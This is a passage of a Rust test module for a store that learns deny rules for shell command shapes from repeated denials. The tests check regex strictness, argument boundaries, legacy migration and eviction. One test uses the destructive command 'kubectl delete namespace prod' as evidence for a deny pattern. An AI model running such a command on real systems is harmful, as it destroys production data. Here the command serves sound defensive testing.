                "kubectl",
                "kubectl",
                r"^.*$",
                &[encoded(&["delete", "namespace", "prod"])],
                "reason",
                2,
            )
            .unwrap_err();
        assert!(err.to_string().contains("too permissive"));
    }

    #[test]
    fn promote_shape_rejects_pattern_that_does_not_match_its_own_evidence() {
        let temp = crate::learned_rules::authority_tempdir();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let err = store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"^delete namespace staging$",
                &[encoded(&["delete", "namespace", "prod"])],
                "reason",
                2,
            )
            .unwrap_err();
        assert!(err.to_string().contains("does not match its own evidence"));
    }

    #[test]
    fn canonical_argv_preserves_argument_boundaries() {
        assert_ne!(
            canonical_argv(&argv(&["value with space"])),
            canonical_argv(&argv(&["value", "with", "space"]))
        );
        assert_eq!(canonical_argv(&[]), "[]");
    }

    #[test]
    fn learned_shape_round_trip_preserves_one_argument_with_spaces() {
        let temp = crate::learned_rules::authority_tempdir();
        let config = config(temp.path().join("deny.yaml"), 1);
        let one = argv(&["object with spaces"]);
        let split = argv(&["object", "with", "spaces"]);
        let evidence = canonical_argv(&one);
        let mut store = DenyShapeStore::load(config.clone()).unwrap();
        store
            .promote_shape(
                "fixture",
                "fixturectl",
                &format!("^{}$", regex::escape(&evidence)),
                &[evidence],
                "fixture denial",
                2,
            )
            .unwrap();
        assert!(store.matches("fixturectl", &one).is_some());
        assert!(store.matches("fixturectl", &split).is_none());

        let reloaded = DenyShapeStore::load(config).unwrap();
        assert!(reloaded.matches("fixturectl", &one).is_some());
        assert!(reloaded.matches("fixturectl", &split).is_none());
    }

    #[test]
    fn legacy_flattened_shape_migrates_to_conservative_binary_quarantine() {
        let temp = crate::learned_rules::authority_tempdir();
        let path = temp.path().join("deny.yaml");
        let legacy = DenyShapeFile {
            version: 1,
            observations: BTreeMap::new(),
            shapes: vec![DenyShape {
                service: "fixture".to_string(),
                binary: "fixturectl".to_string(),
                args_pattern: "^object with spaces$".to_string(),
                legacy_ambiguous: false,
                denials: 2,
                synthesized_at_unix: 1,
                updated_at_unix: 1,
                last_reason: "fixture denial".to_string(),
                evidence_args: vec!["object with spaces".to_string()],
                evidence: String::new(),
            }],
        };
        write_learning_file_atomically(&path, &serde_yaml_ng::to_string(&legacy).unwrap()).unwrap();

        let loaded = DenyShapeStore::load(config(path.clone(), 1)).unwrap();
        assert!(loaded
            .matches("fixturectl", &argv(&["object with spaces"]))
            .is_some());
        assert!(loaded
            .matches("fixturectl", &argv(&["object", "with", "spaces"]))
            .is_some());
        let migrated: DenyShapeFile =
            serde_yaml_ng::from_slice(&std::fs::read(path).unwrap()).unwrap();
        assert_eq!(migrated.version, CURRENT_VERSION);
        assert!(migrated.observations.is_empty());
        assert!(migrated.shapes[0].legacy_ambiguous);
        assert_eq!(migrated.shapes[0].args_pattern, LEGACY_AMBIGUOUS_PATTERN);
        assert!(migrated.shapes[0].evidence_args.is_empty());
    }

    #[test]
    fn observation_buckets_are_capped_by_evicting_the_oldest() {
        let temp = crate::learned_rules::authority_tempdir();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();

        // Fill directly to the cap (bypassing record_denial's per-call file
        // save so the test stays fast), each with a distinct last_seen_unix
        // so eviction order is deterministic.
        for i in 0..MAX_OBSERVATION_BUCKETS {
            store.data.observations.insert(
                format!("service-{i}|bin-{i}"),
                DenyObservation {
                    service: format!("service-{i}"),
                    binary: format!("bin-{i}"),
                    evidence_args: Vec::new(),
                    denials: 1,
                    first_seen_unix: i as u64,
                    last_seen_unix: i as u64,
                    last_command: String::new(),
                    last_reason: String::new(),
                    last_attempt_at_denials: 0,
                },
            );
        }
        assert_eq!(store.observation_count(), MAX_OBSERVATION_BUCKETS);

        // One more, previously-unseen bucket must evict the oldest
        // (last_seen_unix == 0, i.e. "service-0|bin-0") rather than growing
        // past the cap.
        store
            .record_denial("brand-new-bin", &["x".into()], "brand-new-bin x", "new")
            .unwrap();
        assert_eq!(store.observation_count(), MAX_OBSERVATION_BUCKETS);
        assert!(!store.data.observations.contains_key("service-0|bin-0"));
    }

    #[test]
    fn deny_shape_store_never_exposes_an_allow_path() {
        // Structural guarantee, not a runtime check: DenyShapeStore's only
        // public read methods are `matches` (-> Option<&DenyShape>, used
        // solely to fast-reject) and accessors for counts/config. There is
        // no method anywhere in this module that returns or implies an
        // allow decision.
        let temp = crate::learned_rules::authority_tempdir();
        let store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        assert_eq!(store.shape_count(), 0);
    }

    #[test]
    fn stale_deny_instances_merge_observations_but_reject_authority_conflicts() {
        let temp = crate::learned_rules::authority_tempdir();
        let config = config(temp.path().join("deny.yaml"), 2);
        let mut first = DenyShapeStore::load(config.clone()).unwrap();
        let mut second = DenyShapeStore::load(config.clone()).unwrap();
        let command_argv = ["remove".to_string(), "object".to_string()];

        first
            .record_denial(
                "fixturectl",
                &command_argv,
                "fixturectl remove object",
                "unsafe",
            )
            .unwrap();
        let outcome = second
            .record_denial(
                "fixturectl",
                &command_argv,
                "fixturectl remove object",
                "unsafe",
            )
            .unwrap()
            .unwrap();
        assert_eq!(outcome.denials, 2);

        let mut authority_first = DenyShapeStore::load(config.clone()).unwrap();
        let mut authority_second = DenyShapeStore::load(config.clone()).unwrap();
        authority_first
            .promote_shape(
                "fixturectl",
                "fixturectl",
                &exact_pattern(&["remove", "object"]),
                &[encoded(&["remove", "object"])],
                "unsafe",
                2,
            )
            .unwrap();
        assert!(authority_second
            .promote_shape(
                "fixturectl",
                "fixturectl",
                &exact_pattern(&["remove", "other"]),
                &[encoded(&["remove", "other"])],
                "unsafe",
                2,
            )
            .is_err());

        let loaded = DenyShapeStore::load(config).unwrap();
        assert_eq!(loaded.shape_count(), 1);
        assert!(loaded
            .matches("fixturectl", &argv(&["remove", "object"]))
            .is_some());
        assert!(loaded
            .matches("fixturectl", &argv(&["remove", "other"]))
            .is_none());
    }
}
